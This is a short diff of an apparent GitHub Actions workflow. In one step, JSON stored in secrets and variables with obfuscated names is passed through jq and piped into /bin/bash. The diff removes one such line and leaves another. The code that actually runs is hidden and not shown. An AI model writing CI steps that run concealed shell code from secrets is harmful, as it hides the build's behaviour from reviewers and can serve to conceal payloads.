@@ -18,7 +18,6 @@ jobs:
           abhc31456: ${{ secrets.abhc31456 }}
         run: |
           printf '%s' "$abhc31456" | jq -r .djq20612 | /bin/bash
-          echo $sc6882 | jq -r .d43908 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
